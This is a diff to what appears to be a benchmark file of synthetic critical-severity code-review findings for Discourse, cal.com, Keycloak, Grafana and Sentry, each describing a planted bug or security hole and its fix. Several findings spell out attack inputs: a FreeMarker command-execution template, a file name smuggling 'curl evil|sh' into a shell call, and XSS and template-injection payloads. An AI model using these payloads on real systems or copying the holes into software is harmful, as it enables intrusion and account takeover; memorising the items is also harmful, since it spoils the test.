+    "relevantFile": "lib/cooked_post_processor.rb",
+    "relevantLinesStart": 198,
+    "relevantLinesEnd": 204,
+    "suggestionContent": "The onebox fallback now inserts the remote page's `<title>` into the cooked HTML with `.html_safe` and no escaping. Anyone who posts a link to a page they control (titled `<script>...</script>`) gets a script that runs for every reader of the topic, staff included, and can act with their session."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#17",
+   "caseId": "synthetic-critical#17",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "cal.com",
+   "finding": {
+    "relevantFile": "apps/api/v2/src/modules/auth/guards/api-key.guard.ts",
+    "relevantLinesStart": 33,
+    "relevantLinesEnd": 40,
+    "suggestionContent": "WHAT: the guard compares only the first 8 characters of the API key (`key.slice(0, 8)`), which is the public `cal_live_` prefix plus one character. WHY: any string starting with `cal_live_` and the right next character authenticates as whichever key matches first, so an attacker with no key can call the v2 API as another user and read or cancel their bookings. HOW: compare the full hashed key."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#18",
+   "caseId": "synthetic-critical#18",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "keycloak",
+   "finding": {
+    "relevantFile": "services/src/main/java/org/keycloak/theme/FreeMarkerUtil.java",
+    "relevantLinesStart": 71,
+    "relevantLinesEnd": 78,
+    "suggestionContent": "The new custom-message feature renders the realm's `loginMessage` attribute as a FreeMarker template with the default object wrapper, so `?new()` is available. A realm admin of any realm (not only master) can set `${\"freemarker.template.utility.Execute\"?new()(\"id\")}` and run commands on the Keycloak server, reaching every other realm's data. Render the message as plain text."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#19",
+   "caseId": "synthetic-critical#19",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "bug",
+   "source": "synthetic",
+   "repo": "discourse",
+   "finding": {
+    "relevantFile": "app/jobs/scheduled/process_email_queue.rb",
+    "relevantLinesStart": 22,
+    "relevantLinesEnd": 33,
+    "suggestionContent": "WHAT: the job now calls `EmailLog.where(id: ids).update_all(status: 'sent')` before the delivery loop, and the loop's `rescue` just `next`s. WHY: when the mail server is down or any send raises, every email in the batch stays marked sent and is never retried, so on every outage all queued notifications, password resets and digests are lost. HOW: mark each email sent only after its delivery succeeds."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#20",
+   "caseId": "synthetic-critical#20",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "grafana",
+   "finding": {
+    "relevantFile": "pkg/middleware/auth.go",
+    "relevantLinesStart": 112,
+    "relevantLinesEnd": 118,
+    "suggestionContent": "reqGrafanaAdmin is now `c.IsSignedIn && (c.IsGrafanaAdmin || c.OrgRole == org.RoleAdmin)`. Any organization admin, which every user is in their own personal org when `auto_assign_org` is off, now passes the server-admin check and can create users, change any user's password and grant server admin. Keep the check to IsGrafanaAdmin."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#22",
+   "caseId": "synthetic-critical#22",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "cal.com",
+   "finding": {
+    "relevantFile": "packages/features/webhooks/lib/sendPayload.ts",
+    "relevantLinesStart": 60,
+    "relevantLinesEnd": 66,
+    "suggestionContent": "The custom payload template is now rendered with `new Function('data', 'return `' + template + '`')(data)`. Any user who can create a webhook (every user on their own event types) can save a template containing `${process.env.DATABASE_URL}` or `${require('child_process').execSync('...')}`, which runs on the server when a booking fires the webhook. Use the existing safe placeholder replacement."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#23",
+   "caseId": "synthetic-critical#23",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "keycloak",
+   "finding": {
+    "relevantFile": "services/src/main/java/org/keycloak/services/resources/LoginActionsService.java",
+    "relevantLinesStart": 530,
+    "relevantLinesEnd": 539,
+    "suggestionContent": "WHAT: resetCredentials() now reads the target user from the `username` form field on the final step instead of from the authentication session. WHY: an attacker starts a password reset for their own account, receives the email link, and on the final form submits `username=admin` with a new password; the admin's password is changed and the attacker logs in as admin. HOW: take the user only from the authentication session."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#24",
+   "caseId": "synthetic-critical#24",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "discourse",
+   "finding": {
+    "relevantFile": "app/controllers/admin/site_settings_controller.rb",
+    "relevantLinesStart": 14,
+    "relevantLinesEnd": 18,
+    "suggestionContent": "The controller now inherits from ApplicationController instead of Admin::AdminController to share the new caching helper, so `ensure_admin` no longer runs. Any logged-in user can PUT any site setting, for example turn off `enable_local_logins` for everyone, set `sso_url` to their own server and capture every login. Restore the admin base class."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#25",
+   "caseId": "synthetic-critical#25",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "bug",
+   "source": "synthetic",
+   "repo": "sentry",
+   "finding": {
+    "relevantFile": "src/sentry/replays/consumers/recording.py",
+    "relevantLinesStart": 101,
+    "relevantLinesEnd": 112,
+    "suggestionContent": "WHAT: the consumer commits the offset before submitting the message to the processing pool, and pool errors are only logged. WHY: whenever the pool raises (storage unavailable, a worker crash), the message is already committed and will never be redelivered, so every recording segment received during the failure is lost for good, for all organizations. HOW: commit after the segment is stored."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#26",
+   "caseId": "synthetic-critical#26",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "grafana",
+   "finding": {
+    "relevantFile": "public/app/features/dashboard/components/TextPanel/TextPanel.tsx",
+    "relevantLinesStart": 40,
+    "relevantLinesEnd": 46,
+    "suggestionContent": "WHAT: the text panel now renders HTML mode with `dangerouslySetInnerHTML={{ __html: content }}` and the `sanitize` call was removed because it stripped iframes. WHY: any editor can put `<img src=x onerror=fetch('/api/admin/users',{method:'POST',...})>` in a panel, and it runs for every viewer of the dashboard, including server admins, with their session. HOW: keep sanitizing, with an allowlist for iframes if needed."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#27",
+   "caseId": "synthetic-critical#27",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "cal.com",
+   "finding": {
+    "relevantFile": "packages/trpc/server/routers/loggedInViewer/deleteMe.handler.ts",
+    "relevantLinesStart": 20,
+    "relevantLinesEnd": 27,
+    "suggestionContent": "deleteMe now deletes by `input.userId` when it is provided (added for the admin tool) without checking the caller. Any logged-in user can call `viewer.deleteMe({ userId: N })` for any id and permanently delete that account with its bookings, event types and credentials."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#28",
+   "caseId": "synthetic-critical#28",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "keycloak",
+   "finding": {
+    "relevantFile": "services/src/main/java/org/keycloak/authentication/authenticators/browser/WebAuthnAuthenticator.java",
+    "relevantLinesStart": 155,
+    "relevantLinesEnd": 161,
+    "suggestionContent": "WHAT: when the assertion's credential id does not match any registered credential, the code now logs a warning and calls context.success() so users with migrated keys are not locked out. WHY: any attacker who knows a username can present an assertion from their own security key and is authenticated as that user, with no password if WebAuthn is the passwordless first factor. HOW: fail the authentication on an unknown credential id."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#29",
+   "caseId": "synthetic-critical#29",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "discourse",
+   "finding": {
+    "relevantFile": "lib/upload_creator.rb",
+    "relevantLinesStart": 88,
+    "relevantLinesEnd": 95,
+    "suggestionContent": "The new thumbnail step calls `` `convert #{@upload.original_filename} -resize 200x200 #{tmp}` `` with backticks. `original_filename` is the name the uploader sent, so any user who can upload can name a file `a.png;curl evil|sh;.png` and run commands as the app user on the server. Pass arguments as an array to Discourse::Utils.execute_command."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#30",
+   "caseId": "synthetic-critical#30",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "sentry",
+   "finding": {
+    "relevantFile": "src/sentry/api/bases/organization.py",
+    "relevantLinesStart": 190,
+    "relevantLinesEnd": 198,
+    "suggestionContent": "WHAT: OrganizationPermission.has_object_permission now returns True when `request.auth` is any API token, before checking the token's organization. WHY: a user creates a personal token in their own free organization and uses it on `/api/0/organizations/<any-slug>/` endpoints, reading and changing every other organization's projects, members and settings. HOW: check that the token belongs to the organization."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#32",
+   "caseId": "synthetic-critical#32",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "cal.com",
+   "finding": {
+    "relevantFile": "packages/features/auth/lib/next-auth-options.ts",
+    "relevantLinesStart": 140,
+    "relevantLinesEnd": 149,
+    "suggestionContent": "WHAT: the credentials provider now returns the user when `credentials.totpCode` is present and `user.twoFactorEnabled` is true, without calling `authenticator.check`. WHY: the password check sits in the else branch, so a request with any `totpCode` value skips both the password and the code. Anyone who knows the email of a user with 2FA enabled logs in as that user. HOW: verify the password first, then the TOTP code."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#34",
+   "caseId": "synthetic-critical#34",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "bug",
+   "source": "synthetic",
+   "repo": "sentry",
+   "finding": {
+    "relevantFile": "src/sentry/ingest/consumer/processors.py",
+    "relevantLinesStart": 140,
+    "relevantLinesEnd": 150,
+    "suggestionContent": "WHAT: process_event now returns early with `return` (instead of raising) when the cache write fails, and the consumer treats a normal return as success and commits. WHY: whenever the event cache is unavailable, every incoming error event for all projects is acknowledged and discarded without being stored; the outage loses all events silently until the cache recovers. HOW: raise so the message is retried."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#35",
+   "caseId": "synthetic-critical#35",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "discourse",
+   "finding": {
+    "relevantFile": "app/controllers/users_controller.rb",
+    "relevantLinesStart": 455,
+    "relevantLinesEnd": 461,
+    "suggestionContent": "update now permits `:admin` and `:moderator` in `user_params` because the new staff-flair setting is stored next to them. Any user can PUT `/u/<own-username>.json` with `admin=true` and becomes a site admin. Remove those keys from the permitted list."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#36",
+   "caseId": "synthetic-critical#36",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "grafana",
+   "finding": {
+    "relevantFile": "pkg/services/auth/jwt/validation.go",
+    "relevantLinesStart": 70,
+    "relevantLinesEnd": 77,
+    "suggestionContent": "WHAT: when the JWT's `kid` is not in the JWKS, validation now falls back to verifying with the key embedded in the token's `jwk` header. WHY: anyone can sign a token with their own key, embed that public key in the header and set `sub` to any user, including the server admin; Grafana accepts it. HOW: only verify with keys from the configured JWKS."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#37",
+   "caseId": "synthetic-critical#37",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "bug",
+   "source": "synthetic",
+   "repo": "cal.com",
+   "finding": {
+    "relevantFile": "apps/web/app/api/cron/bookingReminder/route.ts",
+    "relevantLinesStart": 35,
+    "relevantLinesEnd": 47,
+    "suggestionContent": "The cron now marks every selected reminder as `sent: true` in one updateMany before the send loop, and the loop swallows errors per reminder. Whenever the email provider fails (rate limit, outage), all reminders of that run stay marked sent and are never retried, for every user, on every failing run."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#38",
+   "caseId": "synthetic-critical#38",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "keycloak",
+   "finding": {
+    "relevantFile": "services/src/main/java/org/keycloak/services/resources/account/AccountRestService.java",
+    "relevantLinesStart": 220,
+    "relevantLinesEnd": 228,
+    "suggestionContent": "WHAT: updateAccount() now copies every attribute from the request into the user, including the read-only ones, since the UserProfile check was removed for performance. WHY: any user can set their own `LDAP_ID` or `KERBEROS_PRINCIPAL` attribute to another user's value and, on the next federated login, is linked to and logged in as that user, an admin included. HOW: keep the user profile validation for read-only attributes."
+   }
+  },
+  {
+   "issueId": "synthetic-critical#39",
+   "caseId": "synthetic-critical#39",
+   "severity": "critical",
+   "severityGold": null,
+   "labelBy": "astra",
+   "label": "security",
+   "source": "synthetic",
+   "repo": "sentry",
+   "finding": {
+    "relevantFile": "static/app/components/events/interfaces/breadcrumbs/breadcrumb/data/default.tsx",
+    "relevantLinesStart": 30,
+    "relevantLinesEnd": 35,
+    "suggestionContent": "Breadcrumb messages are now rendered with `dangerouslySetInnerHTML` so that links are clickable. Breadcrumbs come from the SDK, i.e. from whoever sends events to the project's public DSN, so anyone can send an event whose breadcrumb is `<img src=x onerror=...>`, and it runs in the session of every Sentry user who opens that issue, owners included."
    }
   }
- ]
+ ],
+ "labelling": "severity rated from suggestionContent against definitions.md (Astra, 22/10/26); severityGold keeps the gold-v3 level of the problem"
 }
